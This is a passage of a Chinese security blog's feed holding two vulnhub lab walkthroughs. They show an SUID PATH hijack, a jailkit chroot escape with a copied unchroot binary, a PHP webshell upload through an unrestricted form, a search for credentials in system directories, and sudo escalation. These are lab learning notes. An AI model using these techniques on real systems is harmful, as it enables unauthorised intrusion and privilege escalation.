href="mailto:&#103;&#x6f;&#x67;&#x75;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#x33;&#x31;&#x2e;&#x31;&#55;&#x30;">&#103;&#x6f;&#x67;&#x75;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#x33;&#x31;&#x2e;&#x31;&#55;&#x30;</a></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231509302.png" alt="image-20220416231509302"></p><p>md5解密</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416233616578.png"></p><p>信息收集</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231959222.png" alt="image-20220416231959222"></p><p>尝试suid提权</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null </p><p>没有找到啥东西</p><p>这里发现了linux装了jailkit</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416233959094.png" alt="image-20220416233959094"></p><p>难怪之前的用户命令好多用不了</p><blockquote><p>jailkit 是一款能够在一个chroot jail中快速创建受限用户帐户的工具集。它包含了一个安全日志守护进程，shells可以限制用户，开启和设置chroot jail守护进程的工具。</p></blockquote><p>寻找可以逃避这个准则的文件&#x2F;目录</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416234929096.png" alt="image-20220416234929096"></p><p>看到个神奇的目录 …</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416235021523.png" alt="image-20220416235021523"></p><p>sysdate是个有suid权限的文件，是个和日期有关的文件,但是查看是个乱码，可能是靶机上没有程序能查看它</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416235239648.png" alt="image-20220416235239648"></p><p>下到kali上查看,这是个二进制文件</p><p>ssh <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#51;&#49;&#46;&#49;&#x32;&#x38;">&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#51;&#49;&#46;&#49;&#x32;&#x38;</a> “cat &gt; sysdate” &lt; &#x2F;home&#x2F;gogu&#x2F;…&#x2F;sysdate</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416235957274.png" alt="image-20220416235957274"></p><p>日期”命令是以其相对“路径”执行的，即使用PATH环境变量中包含的路径</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417000226232.png" alt="image-20220417000226232"></p><p>此处的操作可以通过更改此用户的本地 $PATH 变量并将“sysdate”重定向到我们可以控制的另一个二进制文件来完成，也就是说，不是在“&#x2F;bin&#x2F;date”中执行，而是执行“&#x2F;path&#x2F;date” -可操纵”</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417001118473.png" alt="image-20220417001118473"></p><p>这样相当于在文件里得到一个交互性shell(不过回显还是需要添加 1&lt;&amp;2)</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417001400285.png" alt="image-20220417001400285"></p><p>虽然我们获得了 root 权限，但我们仍然被困在“Jail Shell”中,并非真正的root，需要越狱 </p><p>两种方法可以参考 <a href="https://filippo.io/">https://filippo.io/</a></p><p>将编译好的c文件传到靶机上去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh gogu@192.168.131.170 &quot;cat &gt; unchroot&quot; &lt; unchroot</span><br><span class="line"></span><br><span class="line">chmod 777 unchroot</span><br></pre></td></tr></table></figure><p>这里和之前一样执行data文件时候会执行unchroot文件</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417003932844.png" alt="image-20220417003932844"></p><p>执行suid文件</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417004249431.png" alt="image-20220417004249431"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat root.txt 1&lt;&amp;2</span><br></pre></td></tr></table></figure><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417004423898.png" alt="image-20220417004423898"></p><p>优化你的shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 1&lt;&amp;2</span><br></pre></td></tr></table></figure><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417004555404.png" alt="image-20220417004555404"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.强行爆破是真的没有想到，一直以为backup下面还有信息</p><p>2.linux的越狱，还是通过修改输出路径使得suid文件来侧面执行我们想要执行的文件</p><p>3.ssh传递文件的方式  ssh <a href="mailto:&#x78;&#120;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x33;&#49;&#x2e;&#49;&#55;&#48;">&#x78;&#120;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x33;&#49;&#x2e;&#49;&#55;&#48;</a> “cat &gt; cc” &lt; &#x2F;xx&#x2F;xx&#x2F;cc</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这台靶机就是静态ip，我把kali的网卡绑定成和他一样才能联通&lt;/p&gt;</summary>
    
    
    
    <category term="渗透学习" scheme="http://electq.github.io/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="靶场" scheme="http://electq.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulnhub" scheme="http://electq.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>soeasy</title>
    <link href="http://electq.github.io/2022/06/02/soeasy/"/>
    <id>http://electq.github.io/2022/06/02/soeasy/</id>
    <published>2022-06-02T15:28:47.000Z</published>
    <updated>2022-06-06T17:27:29.166Z</updated>
    
    <content type="html"><![CDATA[<p>端午安康！</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206031135773.jpg" alt="wall02"></p><span id="more"></span><p>22端口和80端口允许访问</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206021950102.png" alt="image-20220602195029599"></p><p>web页面,简单的弱密码都不对</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022044258.png" alt="image-20220602204430207"></p><p><code>dirb</code>的字典跑一下一下web的目录</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022047345.png" alt="image-20220602204747293"></p><p>在<code>/flag</code>目录下发现第一个flag</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022049652.png" alt="image-20220602204915628"></p><p><code>/robot.txt</code>中还记录一些没有跑出来的目录</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022052160.png" alt="image-20220602205212131"></p><p>其中<code>/backup</code>,<code>/admin</code>和<code>/r00t</code>都是显示404</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022059195.png" alt="image-20220602205901168"></p><p><code>/admin_area</code>的信息隐藏在源代码中,主要这个前端过于刻意</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022059688.png" alt="image-20220602205942662"></p><p>得到第二个flag已经登录框的用户名和密码(还好没有爆破密码)</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022101743.png" alt="image-20220602210114711"></p><p>进去后的很明显就是需要我们传文件,这里没有限制，传一个简单的PHP🐎就可以</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022105351.png" alt="image-20220602210509281"></p><p>上传后没有回显上传位置，还需要猜一下上传路径，从<code>robots.txt</code>中上传路径是<code>uploaded_files</code>,用蚁剑或者其他WEBSHELL管理工具就可以连接上</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022131787.png" alt="image-20220602213129754"></p><p>网站主目录下发现flag文件，但是显示空白</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022228560.png" alt="image-20220602222802537"></p><p>又发现一个hint文件，原来是权限不足</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022132456.png" alt="image-20220602213253427"></p><p>这里还得到一个<code>technawi</code>用户名，应该是对应SSH连接的，之后又在<code>www</code>目录下翻找没有其他有用信息，推测密码是藏在其他目录下的文件中，根据flag关键字全局搜索，翻找了<code>/etc</code>和<code>tmp</code>两个目录</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022149273.png" alt="image-20220602214930203"></p><p>得到用户名和密码</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022159112.png" alt="image-20220602215906089"></p><p>用SSH连接目标靶机</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022223944.png" alt="image-20220602222332899"></p><p>用这个用户权限再去读取<code>hint</code>文件</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022227797.png" alt="image-20220602222728773"></p><p>查看所有文件(包括隐藏的)，提示过于明显</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022224320.png" alt="image-20220602222455288"></p><p>直接<code>sudo su</code>提权</p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022232849.png" alt="image-20220602223238825"></p><p>root目录下是空的，翻看了一下<code>/etc/passwd</code></p><p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206022241569.png" alt="image-20220602224129502"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;端午安康！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/202206031135773.jpg&quot; alt=&quot;wall02&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透学习" scheme="http://electq.github.io/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="靶场" scheme="http://electq.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
